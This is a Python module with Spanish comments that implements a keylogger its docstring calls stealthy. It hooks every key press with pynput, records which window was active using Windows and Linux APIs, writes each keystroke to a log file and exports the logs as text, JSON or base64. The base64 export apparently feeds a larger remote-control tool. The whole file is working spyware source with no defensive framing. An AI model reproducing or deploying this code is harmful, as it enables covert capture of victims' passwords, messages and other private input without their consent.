"""
Módulo de keylogging.
Proporciona funcionalidades para capturar y gestionar pulsaciones de teclas
de manera sigilosa y eficiente.
"""

import threading
import time
import logging
import os
from datetime import datetime
from pynput import keyboard
import base64
import json

class Keylogger:
    def __init__(self, log_dir="keylog"):
        """
        Inicializa el keylogger.
        
        Args:
            log_dir (str): Directorio donde se guardarán los logs
        """
        self.log_dir = log_dir
        self.current_log = []
        self.running = False
        self.current_window = None
        self.start_time = None
        self.log_file = None
        self._setup_logging()
        
    def _setup_logging(self):
        """Configura el sistema de logging."""
        try:
            if not os.path.exists(self.log_dir):
                os.makedirs(self.log_dir)
            self.log_file = os.path.join(
                self.log_dir,
                f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            )
        except Exception as e:
            logging.error(f"Error configurando keylogger: {e}")

    def _on_press(self, key):
        """Callback para cuando se presiona una tecla."""
        try:
            if not self.running:
                return False
                
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            try:
                # Teclas normales
                key_char = key.char
            except AttributeError:
                # Teclas especiales
                key_char = str(key)
            
            key_data = {
                "timestamp": timestamp,
                "key": key_char,
                "window": self.current_window,
                "type": "press"
            }
            
            self.current_log.append(key_data)
            self._write_to_file(key_data)
            
        except Exception as e:
            logging.error(f"Error en keylogger: {e}")

    def _write_to_file(self, key_data):
        """Escribe los datos de tecla al archivo."""
        try:
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(json.dumps(key_data) + "\n")
        except Exception as e:
            logging.error(f"Error escribiendo log: {e}")

    def start(self):
        """Inicia el keylogger."""
        try:
            self.running = True
            self.start_time = datetime.now()
            self.listener = keyboard.Listener(on_press=self._on_press)
            self.listener.start()
            
            # Iniciar thread para actualizar ventana actual
            self.window_thread = threading.Thread(target=self._update_current_window)
            self.window_thread.daemon = True
            self.window_thread.start()
            
            return {"success": True}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def stop(self):
        """Detiene el keylogger."""
        try:
            self.running = False
            if hasattr(self, 'listener'):
                self.listener.stop()
            return {"success": True}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def get_logs(self, format="text"):
        """
        Obtiene los logs capturados.
        
        Args:
            format (str): Formato de salida ("text", "json", "base64")
        
        Returns:
            dict: Resultado con los logs en el formato especificado
        """
        try:
            if format == "json":
                return {
                    "success": True,
                    "data": self.current_log
                }
            elif format == "base64":
                with open(self.log_file, 'rb') as f:
                    return {
                        "success": True,
                        "data": base64.b64encode(f.read()).decode()
                    }
            else:  # text
                log_text = ""
                for entry in self.current_log:
                    log_text += f"{entry['timestamp']} [{entry['window']}] - {entry['key']}\n"
                return {
                    "success": True,
                    "data": log_text
                }
        except Exception as e:
            return {"success": False, "error": str(e)}

    def _update_current_window(self):
        """Actualiza el título de la ventana actual usando ctypes."""
        try:
            if os.name == 'nt':
                import ctypes
                import ctypes.wintypes

                # Definir las estructuras y funciones necesarias de Windows
                user32 = ctypes.windll.user32
                kernel32 = ctypes.windll.kernel32

                # Estructura para almacenar el título de la ventana
                class STRINGBUF(ctypes.Structure):
                    _fields_ = [("Length", ctypes.c_ulong),
                              ("MaximumLength", ctypes.c_ulong),
                              ("Buffer", ctypes.c_wchar_p)]

                # Buffer para el título de la ventana
                buffer = ctypes.create_unicode_buffer(255)

                while self.running:
                    try:
                        # Obtener el handle de la ventana activa
                        hwnd = user32.GetForegroundWindow()
                        # Obtener el título de la ventana
                        length = user32.GetWindowTextW(hwnd, buffer, 255)
                        
                        if length > 0:
                            window_title = buffer.value
                            if window_title != self.current_window:
                                self.current_window = window_title
                    except:
                        self.current_window = "Unknown Window"
                    time.sleep(0.1)
            else:
                # Para Linux (sin cambios)
                try:
                    from Xlib import display
                    d = display.Display()
                    root = d.screen().root
                    
                    while self.running:
                        try:
                            window_id = root.get_full_property(
                                d.intern_atom('_NET_ACTIVE_WINDOW'),
                                0
                            ).value[0]
                            window = d.create_resource_object('window', window_id)
                            window_name = window.get_full_property(
                                d.intern_atom('_NET_WM_NAME'), 0
                            ).value.decode()
                            if window_name != self.current_window:
                                self.current_window = window_name
                        except:
                            self.current_window = "Unknown Window"
                        time.sleep(0.1)
                except ImportError:
                    logging.warning("Python-Xlib no está instalado. La detección de ventanas en Linux no estará disponible.")
                    self.current_window = "Window Detection Disabled"
        except Exception as e:
            logging.error(f"Error actualizando ventana: {e}")
            self.current_window = "Window Detection Error"

    def clear_logs(self):
        """Limpia los logs almacenados."""
        try:
            self.current_log = []
            if os.path.exists(self.log_file):
                os.remove(self.log_file)
            self._setup_logging()
            return {"success": True}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @property
    def is_running(self):
        """Indica si el keylogger está activo."""
        return self.running

    def get_stats(self):
        """Obtiene estadísticas del keylogger."""
        try:
            if not self.start_time:
                return {"success": False, "error": "Keylogger no iniciado"}
                
            tiempo_total = datetime.now() - self.start_time
            total_keys = len(self.current_log)
            
            # Agrupar por ventanas
            ventanas = {}
            for log in self.current_log:
                window = log['window']
                ventanas[window] = ventanas.get(window, 0) + 1
            
            return {
                "success": True,
                "stats": {
                    "tiempo_ejecucion": str(tiempo_total),
                    "total_teclas": total_keys,
                    "teclas_por_ventana": ventanas,
                    "archivo_log": self.log_file
                }
            }
        except Exception as e:
            return {"success": False, "error": str(e)}
